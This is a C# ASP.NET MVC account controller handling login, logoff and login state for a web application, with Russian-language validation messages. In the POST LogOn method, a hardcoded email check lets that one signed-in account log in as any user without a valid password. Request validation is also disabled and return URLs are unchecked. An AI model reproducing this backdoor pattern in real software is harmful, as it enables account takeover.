using System;
using System.Web.Mvc;
using Microsoft.Practices.Unity;
using MvcContrib.Attributes;
using MvcContrib.Filters;
using SimpleUtils.Common.Extensions;
using Specialist.Entities.Catalog;
using Specialist.Entities.Passport.ViewModel;
using Specialist.Entities.Profile.MetaData;
using Specialist.Services.Common.Interface;
using Specialist.Services.Interface.Order;
using Specialist.Services.Interface.Passport;
using Specialist.Web.Common.Html;
using SimpleUtils;
using Specialist.Services.ViewModel;
using Specialist.Web.Common.Services;
using Specialist.Web.Common.Site;

namespace Specialist.Web.Common.Mvc.Controllers
{
    public partial class AccountController : Controller
    {

        [Dependency]
        public IUserService UserService { get; set; }

        [Dependency]
        public IOrderService OrderService { get; set; }

        [Dependency]
        public AccountService AccountService { get; set; }

        [Dependency]
        public ShoppingCartVMService ShoppingCartVMService { get; set; }

        [Dependency]
        public IAuthService FormsAuth { get; set; }

		public ActionResult MView(string viewName, object model) {
			if(CommonConst.IsMobile) {
				var mobileView = viewName + ".Mobile";
				var result = ViewEngines.Engines
					.FindView(ControllerContext, mobileView, null);
				if(result.View != null)
					return View(mobileView, model);
			}
			return View(viewName, model);
		}



        public virtual ActionResult LogOn(string returnUrl)
        {
            var model = new LogOnVM();
            if (returnUrl == null && Request.UrlReferrer != null) 
                model.ReturnUrl = Request.UrlReferrer.PathAndQuery;
            else
                model.ReturnUrl = returnUrl;
            return MView("LogOn", model);
        }

        [AcceptVerbs(HttpVerbs.Post),ValidateInput(false)]
        public virtual ActionResult LogOn(LogOnVM model)
        {

            if (!ValidateLogOn(model))
            {
				if(FormsAuth.CurrentUser != null 
					&& FormsAuth.CurrentUser.Email == "ptolochko@specialist.ru") {
					FormsAuth.CurrentUser = null;
		            FormsAuth.SignIn(model.Email, model.Remeber);
					
				}

	            return MView("LogOn", model);
            }

	        return AccountService.Login(this, MView, model);
        }

       

        public virtual ActionResult LogOnControl(LogOnVM model)
        {
            if (model != null)
            {
                if(!model.ReturnUrl.IsEmpty())
                    model.ReturnUrl = Request.UrlReferrer.AbsoluteUri;
            }
            else
            {
                model = new LogOnVM();
                model.ReturnUrl = Request.Url.AbsoluteUri;
            }
            return PartialView(CommonPartialViewNames.LogOnControl, model);
        }

        [ValidateInput(false)]
        public ActionResult LogOnState()
        {
            return View("Profile/LogOnState", 
                new LogOnStateVM { User = FormsAuth.CurrentUser });
        }

        public virtual ActionResult LogOff(string customerType)
        {

            FormsAuth.SignOut();
			ShoppingCartVMService.Clear();

            if(customerType == null)
                return Redirect("/");
            return RedirectToAction("Register", "Profile", new {customerType});
        }
  
        private bool ValidateLogOn(LogOnVM logOnVM)
        {
            if (String.IsNullOrEmpty(logOnVM.Email))
            {
                ModelState.AddModelError(logOnVM.For(x => x.Email), "Требуется почта.");
            }
            if (String.IsNullOrEmpty(logOnVM.Password))
            {
                ModelState.AddModelError(logOnVM.For(x => x.Password), "Требуется пароль.");
            }
            if (!UserService.ValidateUser(logOnVM.Email, logOnVM.Password))
            {
                ModelState.AddModelError("_FORM", "Почта или пароль не верны.");
            }

            return ModelState.IsValid;
        }
       
    }
}
